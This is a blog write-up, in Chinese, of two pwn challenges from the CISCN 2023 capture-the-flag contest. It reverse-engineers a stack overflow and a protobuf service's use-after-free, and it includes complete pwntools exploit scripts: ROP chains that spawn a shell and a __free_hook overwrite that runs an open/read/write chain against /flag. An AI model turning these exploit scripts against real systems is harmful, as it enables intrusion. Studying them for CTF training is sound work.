---
title: "CISCN2023的PWN"
description: "第一次打国赛！"
pubDate: "Jun 03 2023"
published: true
heroImage: "../../assets/7.png"
tags: ["技术"]
---
## 烧烤摊儿（整数溢出+syscall）
#### 漏洞一：有符合的整数
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685154391132-abb0ff9a-bd20-43c6-896a-0a7c2d694b71.png#averageHue=%23040302&clientId=u9dccbb64-7a49-4&from=paste&height=505&id=u2af6f391&originHeight=834&originWidth=1380&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=110936&status=done&style=none&taskId=u7c136378-6e1c-4b2c-872b-cc62c6056a8&title=&width=836.3635880231228)
#### 漏洞二：复制时候的栈溢出
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685154449944-58e7c324-5d0a-473b-bd52-c7575c453487.png#averageHue=%23040302&clientId=u9dccbb64-7a49-4&from=paste&height=252&id=ub24519a8&originHeight=415&originWidth=1266&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=45002&status=done&style=none&taskId=ubd71bfc8-c968-46f8-8ddc-424f024b43d&title=&width=767.2726829255605)
#### 疑惑：为什么canary保护不用绕过
> 虽然开了canary，但是可以看到gaiming函数并不会检测rbp-0x8处的值是否被破坏

为了明白这个点，我看了一下要爆破canary的题目
> 下面是需要爆破canary的

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685370766755-02f110cb-78ea-4cf5-9b74-a238484a0147.png#averageHue=%23828180&clientId=u9413e72c-93d8-4&from=paste&height=558&id=u5e5e351c&originHeight=921&originWidth=1015&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=138156&status=done&style=none&taskId=u5d6b8d7b-d929-4b3e-8b85-64ab14efa0d&title=&width=615.1514795967172)
> 下面是本题的，不用绕过

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685370814842-c659d21a-31ea-4140-b2dc-ba66afa7fc3f.png#averageHue=%23020101&clientId=u9413e72c-93d8-4&from=paste&height=541&id=u5860132f&originHeight=893&originWidth=1056&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=65028&status=done&style=none&taskId=uc9755ff3-3f0c-4b4d-8e84-58e260cb6de&title=&width=639.9999630089984)<br />**所以，在有栈溢出的情况，是否需要爆款绕过canary，请查看汇编代码，看具体的执行流程。**
#### ROPgadget的收集解法
因为题目的符号很多的没有，所以最好的方法，就是使用syscall<br />又因为题目没有什么限制，所以直接使用ropchain生成即可

- 发送很大的负数刷新金币
- 栈溢出出rop链接
> 比赛出现的问题：对于syscall一些执行函数的参数不够熟悉，后面去整理这方面的内容，方便写题更高效的去构造

```python
from pwn import *
from struct import pack

context.log_level = 'debug'
io = process("./shaokao")

# execve generated by ROPgadget
# Padding goes here
p = b''
p += pack('<Q', 0x000000000040a67e) # pop rsi ; ret
p += pack('<Q', 0x00000000004e60e0) # @ .data
p += pack('<Q', 0x0000000000458827) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000045af95) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040a67e) # pop rsi ; ret
p += pack('<Q', 0x00000000004e60e8) # @ .data + 8
p += pack('<Q', 0x0000000000447339) # xor rax, rax ; ret
p += pack('<Q', 0x000000000045af95) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040264f) # pop rdi ; ret
p += pack('<Q', 0x00000000004e60e0) # @ .data
p += pack('<Q', 0x000000000040a67e) # pop rsi ; ret
p += pack('<Q', 0x00000000004e60e8) # @ .data + 8
p += pack('<Q', 0x00000000004a404b) # pop rdx ; pop rbx ; ret
p += pack('<Q', 0x00000000004e60e8) # @ .data + 8
p += pack('<Q', 0x4141414141414141) # padding

p += pack('<Q', 0x0000000000447339) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000402404) # syscall

io.sendline('1')

io.sendline('1')

io.sendline('-100000')

io.sendline('4')

io.sendline('5')

pause( )

offset = 0x20 + 8
paylaod = offset*b'a' + p

io.sendline(paylaod)

pause( );

io.interactive()
```
#### 使用ropper
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685372455750-4648c932-8c18-47ee-ba9d-20da3aec53d2.png#averageHue=%23060504&clientId=u6d9848d8-7586-4&from=paste&height=716&id=uf729e92f&originHeight=1182&originWidth=1356&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=346307&status=done&style=none&taskId=u08e7c6f5-374a-4602-bbdf-bc028442935&title=&width=821.8181343183729)<br />我用ropper生存的攻击，是失败的。
> 但是，ropper很适合用来构造rop链时候的辅助

#### 手动构造ROP链接
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685374101249-eb060b94-1ad5-4b47-81ac-c77895a8fb82.png#averageHue=%23060302&clientId=u321c515a-fa18-4&from=paste&height=151&id=u8789d147&originHeight=249&originWidth=1183&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=29839&status=done&style=none&taskId=u888a37a6-3e30-468a-a350-945cbe46604&title=&width=716.9696555299669)<br />注意到，写入的name地址是固定的，所以可以考虑往这里写/bin/sh<br />虽然本题无system，但是存在syscall，所以考虑syscall调用<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685374241277-16f7dcd2-f0d4-4daa-b1f7-70a32a375ddc.png#averageHue=%23150a04&clientId=u321c515a-fa18-4&from=paste&height=351&id=ufc92d9eb&originHeight=579&originWidth=1175&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=245785&status=done&style=none&taskId=u9af5d164-c876-447f-b8c4-fdc56626223&title=&width=712.1211709617169)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685374484043-b34e9543-9ace-437d-a341-c8167d2fee61.png#averageHue=%23140904&clientId=u321c515a-fa18-4&from=paste&height=234&id=u6e0841e2&originHeight=386&originWidth=1151&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=139340&status=done&style=none&taskId=ue73bf5d0-b589-4104-b612-d4ecfd27668&title=&width=697.575717256967)
```c
from pwn import *

elfname = './shaokao'

local = 1
if local:
    p = process(elfname)
else:
    p = remote('123.56.236.235', 30501)
elf = ELF(elfname)


context.log_level = 'debug'
context.arch = 'amd64'
context.binary = elfname


r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
c = lambda: p.close()
li = lambda x: log.info(x)
db = lambda: gdb.attach(p)
uu32 = lambda data: u32(data.ljust(4, b'\x00'))
uu64 = lambda data: u64(data.ljust(8, b'\x00'))


loginfo = lambda tag, addr: log.success(tag + " -> " + hex(addr))
def menu(ch):
    sla(">",str(ch))
def chuan(ch,num):
    menu(2)
    sla(". ",str(ch))
    sla("\n",str(num))
def game(cont):
    menu(5)
    sla("",cont)

#dbg()

chuan(2,'-100000')

menu(4)

poprdi=0x000000000040264f
poprsi=0x000000000040a67e
poprdx=0x00000000004a404b
poprax=0x0000000000458827
syscalret=0x00000000004230a6
name=0x4E60F0

payload=b"/bin/sh\x00"+b'\x00'*0x20+p64(poprdi)+p64(name)+p64(poprsi)+p64(0)+p64(poprdx)+p64(0)*2+p64(poprax)+p64(59)
payload+=p64(syscalret)

game(payload)

p.interactive( )
```
## Strangetalkbot（protocal）

### 逆向分析
> 前言，本题是protocal
> [Protobuf](https://developers.google.com/protocol-buffers/)是由Google开发的一种序列化格式，用于越来越多的Android，Web，桌面和更多应用程序。它由一种用于声明数据结构的语言组成，然后根据目标实现将其编译为代码或另一种结构。

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685428257017-08ba6194-9357-414a-9839-c245faec8d96.png#averageHue=%23313030&clientId=uc9ea2a7e-31a5-4&from=paste&height=594&id=uee8b634e&originHeight=980&originWidth=1727&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=212377&status=done&style=none&taskId=u920f3082-3a67-4588-bfd9-1fe8f72ed05&title=&width=1046.6666061709661)<br />快速搜索magic可以定位到源码的仓库，当然也可以直接点击，就会发现了<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685459048004-73e17803-2ce5-4106-8dda-52bb31eb004d.png#averageHue=%23050302&clientId=u0082e65c-a6da-4&from=paste&height=336&id=u16f4f143&originHeight=555&originWidth=1467&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=75468&status=done&style=none&taskId=u4db6bf6d-76b1-4910-8dfa-a385f87d5f8&title=&width=889.0908577028415)
### 提取结构体
>  保存为.proto文件

#### 查找对应的结构参数方法
> 直接看符合表，然后一个个查

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685461665371-fbb63052-04ea-4af2-ba01-eca2d4d7e388.png#averageHue=%23353331&clientId=u38768434-f11b-4&from=paste&height=296&id=ud14eb8e5&originHeight=488&originWidth=926&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=95563&status=done&style=none&taskId=u3459790c-4b1e-4ef5-bc5b-600a59b48ca&title=&width=561.2120887749361)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685461686511-aee0bf0b-380f-4612-b90b-8d5bc7a8ef2a.png#averageHue=%23020201&clientId=u38768434-f11b-4&from=paste&height=250&id=ue8fe8815&originHeight=412&originWidth=1295&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=56894&status=done&style=none&taskId=u554e94ab-91a0-4bf5-9af2-eb0a9f07f1f&title=&width=784.8484394854668)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685461704999-8b8be39d-45c2-4f29-945d-48d1470c6520.png#averageHue=%23080703&clientId=u38768434-f11b-4&from=paste&height=114&id=u7ed0d7ed&originHeight=188&originWidth=1206&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=31649&status=done&style=none&taskId=u3c557c52-1aee-41cb-aaa8-fd4748c7746&title=&width=730.9090486636857)
> 快捷键：ctrl + X 快速交叉引用

#### 自动化提取分析
> [https://github.com/marin-m/pbtk](https://github.com/marin-m/pbtk)
> 貌似行不通，openjdk-9我换成openjdk-11

```
sudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5

$ sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-client

$ git clone https://github.com/marin-m/pbtk
$ cd pbtk
$ ./gui.py
```
#### 使用protocal编译
```python
sudo apt-get install protobuf-compiler
```
```
protoc --python_out=./ ./ctf.proto
```
#### 最终的结果
> 只能使用字符一个个逆向分析。
> 特别留意 sint64 跟 int64 不是一个东西
> 使用proto3，因为更方便
> 最后我使用的是proto2，因为懒哈哈哈，复现脚本使用proto2的写得好
> 拷贝的时候，提示字符不是ASCII的问题，就是没有切换为英文输入法

```python
syntax = "proto2";

message Devicemsg {
 required sint64 actionid =1;
 required sint64 msgidx =2;
 required sint64 msgsize =3;
 required bytes msgcontent=4;
}


```
```python
# Generated by the protocol buffer compiler.  DO NOT EDIT!
# source: devicemsg.proto

import sys
_b=sys.version_info[0]<3 and (lambda x:x) or (lambda x:x.encode('latin1'))
from google.protobuf import descriptor as _descriptor
from google.protobuf import message as _message
from google.protobuf import reflection as _reflection
from google.protobuf import symbol_database as _symbol_database
from google.protobuf import descriptor_pb2
# @@protoc_insertion_point(imports)

_sym_db = _symbol_database.Default()




DESCRIPTOR = _descriptor.FileDescriptor(
  name='devicemsg.proto',
  package='',
  syntax='proto2',
  serialized_pb=_b('\n\x0f\x64\x65vicemsg.proto\"R\n\tDevicemsg\x12\x10\n\x08\x61\x63tionid\x18\x01 \x02(\x12\x12\x0e\n\x06msgidx\x18\x02 \x02(\x12\x12\x0f\n\x07msgsize\x18\x03 \x02(\x12\x12\x12\n\nmsgcontent\x18\x04 \x02(\x0c')
)
_sym_db.RegisterFileDescriptor(DESCRIPTOR)




_DEVICEMSG = _descriptor.Descriptor(
  name='Devicemsg',
  full_name='Devicemsg',
  filename=None,
  file=DESCRIPTOR,
  containing_type=None,
  fields=[
    _descriptor.FieldDescriptor(
      name='actionid', full_name='Devicemsg.actionid', index=0,
      number=1, type=18, cpp_type=2, label=2,
      has_default_value=False, default_value=0,
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None),
    _descriptor.FieldDescriptor(
      name='msgidx', full_name='Devicemsg.msgidx', index=1,
      number=2, type=18, cpp_type=2, label=2,
      has_default_value=False, default_value=0,
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None),
    _descriptor.FieldDescriptor(
      name='msgsize', full_name='Devicemsg.msgsize', index=2,
      number=3, type=18, cpp_type=2, label=2,
      has_default_value=False, default_value=0,
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None),
    _descriptor.FieldDescriptor(
      name='msgcontent', full_name='Devicemsg.msgcontent', index=3,
      number=4, type=12, cpp_type=9, label=2,
      has_default_value=False, default_value=_b(""),
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      options=None),
  ],
  extensions=[
  ],
  nested_types=[],
  enum_types=[
  ],
  options=None,
  is_extendable=False,
  syntax='proto2',
  extension_ranges=[],
  oneofs=[
  ],
  serialized_start=19,
  serialized_end=101,
)

DESCRIPTOR.message_types_by_name['Devicemsg'] = _DEVICEMSG

Devicemsg = _reflection.GeneratedProtocolMessageType('Devicemsg', (_message.Message,), dict(
  DESCRIPTOR = _DEVICEMSG,
  __module__ = 'devicemsg_pb2'
  # @@protoc_insertion_point(class_scope:Devicemsg)
  ))
_sym_db.RegisterMessage(Devicemsg)


# @@protoc_insertion_point(module_scope)
```
### 静态IDA分析
> 对着代码进行逆向分析，猜测每个参数的功能及其函数的作用，并且重新命名

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685580556158-4eb13681-c209-4a1b-a220-a6913e82b496.png#averageHue=%23020201&clientId=ua070afbe-e856-4&from=paste&height=455&id=ue0f5f1e8&originHeight=750&originWidth=1797&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=79743&status=done&style=none&taskId=u95652ff5-ce3d-42cd-afa7-fb5944c2f84&title=&width=1089.0908461431534)
#### 复原结构体的状况
> 有一个bss存size和一个bss存ptr

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685581320088-0a00cce1-2b00-4e25-a0f2-1348292d60f5.png#averageHue=%23040302&clientId=ua070afbe-e856-4&from=paste&height=226&id=u7710641c&originHeight=373&originWidth=1122&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=35001&status=done&style=none&taskId=ue327375b-8d91-4d41-bc23-86f23ee677c&title=&width=679.9999606970607)
### UAF漏洞
> 这里有误导性，其实把东西拿出来给result
> 但是实际变的是临时变量，真实的位置没有发生变化
> 其次，最后置于零的是你的输入
> 这里的置零不是指针置零，所以这个存在uaf漏洞

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685581472874-2790c0d6-fe97-4d0d-a0d2-f3bc64b03042.png#averageHue=%23090806&clientId=ua070afbe-e856-4&from=paste&height=247&id=u491a0359&originHeight=408&originWidth=1090&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=55158&status=done&style=none&taskId=u94ecc264-6fce-47b8-86df-f27f309b63c&title=&width=660.6060224240608)
#### 因为是2.31的UAF漏洞，所以感觉不会那么简单
查一下沙箱<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685581608250-0fac0778-d152-4ca9-a367-57897799ab04.png#averageHue=%23091011&clientId=ua070afbe-e856-4&from=paste&height=245&id=u881088b8&originHeight=404&originWidth=1316&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=226620&status=done&style=none&taskId=u41572b2a-8c95-40ff-9976-19a8b7030d9&title=&width=797.5757114771229)
#### 攻击思路
因为有沙箱，能用orw，所以考虑使用orw配合使用setcontext进行读取flag即可
> 什么是setcontext
> [https://www.cnblogs.com/pwnfeifei/p/15819825.html](https://www.cnblogs.com/pwnfeifei/p/15819825.html)
> 其实就是SROP
> 用mov_rdx_rdi即可读取了
> 本题去了符号，难找到原型，不过你大体可以知道，它是长这样的
> ![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685582158804-65ce16e5-021a-49d0-81d1-36406c6f1d00.png#averageHue=%23faf9f7&clientId=ua070afbe-e856-4&from=paste&id=u3272a94a&originHeight=701&originWidth=1116&originalType=url&ratio=1.5&rotation=0&showTitle=false&size=81764&status=done&style=none&taskId=u27552ca1-c036-45f4-bbf3-cff08ca9dbf&title=)

### EXP
> 补充一个小技巧，使用glibc-all-in-one的时候
> 因为libc不一定一样
> 所以先patchelf
> 最后在目录中，把libc文件删除，换成远程给的即可
> 现在内容就是正确的了
> ![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685590107587-f26a70bc-1c85-424e-a3f2-9d8d19b3d590.png#averageHue=%2334312a&clientId=ua070afbe-e856-4&from=paste&height=353&id=u0ff51a17&originHeight=582&originWidth=1220&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=140955&status=done&style=none&taskId=ub277a0c0-c33f-4343-a73c-e87c3e2609b&title=&width=739.3938966581231)

```python
from pwn import *
context(arch='amd64',os='linux',log_level='debug')

sd = lambda s:p.send(s)
sl = lambda s:p.sendline(s)
rc = lambda s:p.recv(s)
ru = lambda s:p.recvuntil(s)
sda = lambda a,s:p.sendafter(a,s)
sla = lambda a,s:p.sendlineafter(a,s)
irt = lambda :p.interactive()
dbg = lambda s=None:gdb.attach(p,s)
uu32 = lambda d:u32(d.ljust(4,b'\0'))
uu64 = lambda d:u64(d.ljust(8,b'\0'))

p = process('./pwn')
#p = remote('123.57.248.214',21202)

import devicemsg_pb2

def new(i,s,c):
        msg = devicemsg_pb2.Devicemsg()  #弄一个序列化结构体，其实就是类似JSON
        msg.actionid = 1  #结构体初始化
        msg.msgidx = i
        msg.msgsize = s
        msg.msgcontent = c
        sda(': \n',msg.SerializeToString()) #序列化
def free(i):
        msg = devicemsg_pb2.Devicemsg()
        msg.actionid = 4
        msg.msgidx = i
        msg.msgsize = 0
        msg.msgcontent = b''
        sda(': \n',msg.SerializeToString())
def show(i):
        msg = devicemsg_pb2.Devicemsg()
        msg.actionid = 3
        msg.msgidx = i
        msg.msgsize = 0
        msg.msgcontent = b''
        sda(': \n',msg.SerializeToString())
def edit(i,c):
        msg = devicemsg_pb2.Devicemsg()
        msg.actionid = 2
        msg.msgidx = i
        msg.msgsize = 0
        msg.msgcontent = c
        sda(': \n',msg.SerializeToString())

    
#tcache中每个链表最多7个节点(chunk)
#暴tcache，进入unsorted bin
for i in range(8):
        new(i,0xf0,b'')
for i in range(8):
        free(i)
#泄露main_arena
show(7)
rc(0x50)
#计算出libc，使用main_arena的工具
libc_base = uu64(rc(8))-0x1ecbe0
success('libc_base --> %s',hex(libc_base))

#泄露堆指针.指向的tcache的结构
show(0)
rc(8)
heap_base = uu64(rc(8))-0x10
success('heap_base --> %s',hex(heap_base))

pop_rdi_ret = libc_base+0x0000000000023b6a
pop_rsi_ret = libc_base+0x000000000002601f
pop_rdx_ret = libc_base+0x0000000000142c92
pop_rax_ret = libc_base+0x0000000000036174
syscall_ret = libc_base+0x00000000000630a9
free_hook = libc_base+0x1eee48

edit(6,p64(free_hook) + flat([
        libc_base+0x0000000000025b9b, #利用了csu的gadget
        0,
        heap_base+0xad0,
        pop_rdi_ret,
        heap_base+0xad0,
        pop_rsi_ret,
        0,
        pop_rdx_ret,
        0,
        pop_rax_ret,
        2,
        syscall_ret, # open
        pop_rdi_ret,
        3,
        pop_rsi_ret,
        heap_base+0xad0,
        pop_rdx_ret,
        0x30,
        pop_rax_ret,
        0,
        syscall_ret, # read
        pop_rdi_ret,
        1,
        pop_rax_ret,
        1,
        syscall_ret, # write
]))

new(8,0xf0,flat({ #使用flat将多个序列生成单一序列
        0x00: 0x67616C662F, # /flag  #在偏移0x00处存入flag字段
        0x28: libc_base+0x00000000000578c8, #在偏移0x28处存入地址
        0x48: heap_base+0xfa0  #指向字符串的位置
}, filler=b'\x00')) #最后有b'\x00' 填充剩余的位置
new(9,0xf0,p64(libc_base+0x0000000000154dea)) # rbp=[rdi+0x48]; rax=[rbp+0x18]; call [rax+0x28]
#dbg('b *(free+161)\nc')
free(8)

irt()
```
### 调试的全过程
#### 泄露Libc
```python
#tcache中每个链表最多7个节点(chunk)
#暴tcache，进入unsorted bin
for i in range(8):
        new(i,0xf0,b'')
for i in range(8):
        free(i)
#泄露main_arena
show(7)
rc(0x50)
#计算出libc，使用main_arena的工具
libc_base = uu64(rc(8))-0x1ecbe0
success('libc_base --> %s',hex(libc_base))
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685597272680-c25a1fd1-14e3-4725-a614-71f7b1c0f174.png#averageHue=%23040302&clientId=u5b8e4ff9-0d4c-4&from=paste&height=299&id=u893348df&originHeight=493&originWidth=2442&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=188240&status=done&style=none&taskId=uf34b8568-44c6-4ad5-b121-4a8b1281533&title=&width=1479.9999144583087)
#### 泄露堆地址
```python
#泄露堆指针.指向的tcache的结构
show(0)
rc(8)
heap_base = uu64(rc(8))-0x10
success('heap_base --> %s',hex(heap_base))
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685597355673-2476c939-9b84-44e1-86df-f413f195642b.png#averageHue=%23080706&clientId=u5b8e4ff9-0d4c-4&from=paste&height=525&id=uf1df2a7f&originHeight=867&originWidth=2473&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=438250&status=done&style=none&taskId=ufe75a984-a4ae-4e89-b10c-0e1fc43c0ea&title=&width=1498.7877921602774)
#### 寻找free_hook
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685597411894-851b37d9-b230-46ee-a369-5b04499dc663.png#averageHue=%230b0903&clientId=u5b8e4ff9-0d4c-4&from=paste&height=342&id=u4687bcc2&originHeight=564&originWidth=1254&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=229483&status=done&style=none&taskId=u79ac5549-7a26-412e-ba9b-07e149482cf&title=&width=759.9999560731856)
#### 修改idx=6，即目前第一个tcache的fd和内容--为rop链
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685597498356-e22901af-9bd5-48b6-b455-7f392efe7679.png#averageHue=%23030202&clientId=u5b8e4ff9-0d4c-4&from=paste&height=210&id=u73b74baf&originHeight=347&originWidth=2459&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=178891&status=done&style=none&taskId=uefdeb739-ff2d-42b3-83f5-57554fa1ffc&title=&width=1490.30294416584)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685597637953-e4522246-f889-4a85-902e-c78017545fdb.png#averageHue=%23161412&clientId=u5b8e4ff9-0d4c-4&from=paste&height=701&id=u05b93fc9&originHeight=1156&originWidth=1224&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=269288&status=done&style=none&taskId=uf9b7eb2f-5a4b-4749-b2bc-d44c0e63dc2&title=&width=741.8181389422481)
> **一点迷思迷思迷思迷思！！！：**
> ![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685598731875-97df3eab-da9f-43f1-a8b7-ddee9d276974.png#averageHue=%231f1c1a&clientId=u5b8e4ff9-0d4c-4&from=paste&height=522&id=ud7fda63d&originHeight=861&originWidth=1197&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=181957&status=done&style=none&taskId=u81283d43-af0e-4420-b1fa-abeca651648&title=&width=725.4545035244043)
> **为什么都是用heap_base+ad0**
> **因为，tcache就是一个堆，我们泄露出来的，是堆的分配收地址**
> **这是按内存对齐的！！！**
> **而只要我们加ad0，就能到我们想要去的地方，即第7个chunk**

这里利用了csu的gadget<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685599731765-2144869f-095f-49f4-85e6-c933b11c61ab.png#averageHue=%23070604&clientId=u5b8e4ff9-0d4c-4&from=paste&height=216&id=u42ae13f8&originHeight=357&originWidth=1744&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=74432&status=done&style=none&taskId=u302ab0f5-f1b8-481e-a21f-682a0a00461&title=&width=1056.9696358784972)
```python
edit(6,p64(libc_base+0x1eee48) + flat([
        libc_base+0x0000000000025b9b,
        0,
        heap_base+0xad0, #第7个chunk，idx=6
        pop_rdi_ret,
        heap_base+0xad0,
        pop_rsi_ret,
        0,
        pop_rdx_ret,
        0,
        pop_rax_ret,
        2,
        syscall_ret, # open
        pop_rdi_ret,
        3,
        pop_rsi_ret,
        heap_base+0xad0,
        pop_rdx_ret,
        0x30,
        pop_rax_ret,
        0,
        syscall_ret, # read
        pop_rdi_ret,
        1,
        pop_rax_ret,
        1,
        syscall_ret, # write
]))

```
#### 往分配出来的新chunk，即原先idx=6的chunk进行写
> 通过AIT+T寻找
> 不对，还有其他方法：搜索libc中的gadget（使用ropper）

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685600356905-2033730a-549c-4150-ba1a-605cd4b8b607.png#averageHue=%230d0503&clientId=u5b8e4ff9-0d4c-4&from=paste&height=65&id=u77a401e6&originHeight=108&originWidth=1139&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=9367&status=done&style=none&taskId=ueb0c043b-27eb-41c6-bc53-08ae3206e80&title=&width=690.3029904045919)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1685602083502-9f9eae19-0228-4068-a991-b0421e68d069.png#averageHue=%23070a0a&clientId=u6bbf0b64-1d57-4&from=paste&height=105&id=u7d9c0a68&originHeight=174&originWidth=1357&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=88972&status=done&style=none&taskId=u56c9d807-bc69-4948-910d-4805245afaa&title=&width=822.4241948894041)
> 迷思：为什么还可以在原来的基础上编辑
